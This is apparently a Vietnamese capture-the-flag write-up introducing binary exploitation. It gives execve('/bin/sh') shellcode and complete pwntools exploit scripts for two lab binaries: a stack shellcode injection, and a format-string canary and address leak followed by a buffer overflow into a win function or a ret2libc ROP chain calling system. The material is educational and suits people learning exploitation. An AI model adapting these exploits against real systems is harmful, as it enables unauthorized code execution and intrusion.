# **Pwnable Introduction**

## Shellcode

Đoạn shellcode

![image](https://user-images.githubusercontent.com/31529599/146813979-67d509fd-73c4-473f-a899-08b519796336.png)

`\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x48\x31\xf6\x48\x31\xd2\x53\x54\x5f\xb0\x3b\x0f\x05`

## Challenge 1
- Receive địa chỉ và inject shellcode trên stack vào địa chỉ receive được

### Solve script
```python
from pwn import *
binary = context.binary = ELF('./demo')

p = process('./demo')
add_s = p.recv().decode().strip().split(' ')[1]
add = int(add_s[2:],16)

shellcode =  b'\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x48\x31\xf6\x48\x31\xd2\x53\x54\x5f\xb0\x3b\x0f\x05'
print(len(shellcode))

payload = shellcode + b'A' * (40-len(shellcode)) + p64(add)

with open('payload.in', 'wb') as f:
        f.write(payload)

        p.sendline(payload)
        p.interactive()
```
### Chạy Script
![image](https://user-images.githubusercontent.com/31529599/146814656-bc320e27-a901-4d63-951b-4c3d32b48b79.png)

## Challenge 2
- Bài này bật tất cả protection, tuy nhiên bị lỗi format string, nên có thể leak được canary và địa chỉ của các hàm và địa chỉ stack, từ đây có thể sử dụng để buffer overflow địa chỉ trả về và tính địa chỉ trả về.
- Bài này ngoài cách tính vị trí stack của hàm `win` để chèn chuỗi `Nghi Hoang Khoa dep trai` để thõa mản điều kiện gọi hàm `system('/bin/sh')` còn có thể gọi trực tiếp `system` bằng kĩ thuật Ret2libc

### Cách 1
Ta có `ebp` của hàm `vuln` là `0x7fff4989f490` => địa chỉ biến được `read` vào là `0x7fff4989f490 -    x60`

`ebp` của hàm `win` là `0x7fff4989f498` => địa chỉ của chuỗi `Nghi Hoang Khoa dep trai` là `0x7fff4989f498 - 0x50`

Vậy khoảng cách giữa vị trí nhập vào và vị trí chuỗi thỏa điều kiện sẽ là : `(0x7fff4989f498-0x50) - (0x7fff4989f490-0x60) = 24`


offset format string của canary và địa chỉ trả về của hàm `vuln` (`main + 0x3a`) lần lượt là `19` và `21`

#### Script Solve
```python
from pwn import *
binary = ELF('./basic')
p = process("./basic")
p.sendline(b'2147483649')
p.sendline(b"%19$lx.%21$lx")
p.recvuntil(b'Nhap do dai tin nhan: ')
canary, leak = p.recv().split(b'\n')[0].split(b'.')


canary = int(canary.decode(), 16)
leak_main = int(leak.decode(), 16) - 0x3a

print('canary: ', hex(canary))
print('leak: ',hex(leak_main))


p.sendline(b'1')
base_addr = leak_main - binary.symbols['main']

str_hardcode = b"Nghi Hoang Khoa dep trai"

payload =b'A'*24 +  str_hardcode + b'A'*(0x60-len(str_hardcode)-8-24) + p64(canary) + b'A'*8+ p64(base_addr + binary.symbols['win']) 


p.sendline(payload)

p.interactive()

```
#### Chạy script
![image](https://user-images.githubusercontent.com/31529599/146815513-812e8a0c-71cc-4a45-8aee-a0372e960f03.png)


### Cách 2 Ret2lic 

Ở đây mình chỉ để Script tham khảo

```python 
from pwn import *
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.32.so')
binary = ELF('./basic')
rop = ROP(libc)
p = process("./basic")
p.sendline(b'2147483649')
p.sendline(b"%19$lx.%21$lx.%23$lx")
p.recvuntil(b'Nhap do dai tin nhan: ')
canary, leak, lib_start_main = p.recv().split(b'\n')[0].split(b'.')

canary = int(canary.decode(), 16)
leak_main = int(leak.decode(), 16) - 0x3a
lib_start_main = int(lib_start_main.decode(), 16)-234

print('canary: ', hex(canary))


base_addr = leak_main - binary.symbols['main']


base_addr_libc = lib_start_main - libc.symbols['__libc_start_main']
print('base addr: ', hex(base_addr_libc))


# pop_rdi_ret = base_addr_libc +  rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rdi_ret = 0x0000000000001453 + base_addr
# print('base addr: ',hex(base_addr))
print('rop finding: ', hex(rop.find_gadget(['pop rdi', 'ret'])[0]))
binsh_addr = base_addr_libc + list(libc.search(b'/bin/sh'))[0]
print('binsh: ', hex(binsh_addr))

p.sendline(b'1')

payload = b'A'*(104-16) + p64(canary) + b'A'*8 + p64(pop_rdi_ret) + \
    p64(binsh_addr) + p64(base_addr_libc+libc.symbols['system'])
p.sendline(payload)

p.interactive()

```

![image](https://user-images.githubusercontent.com/31529599/146815970-1ae4bd16-d482-43ab-bb62-fbedbad731ed.png)

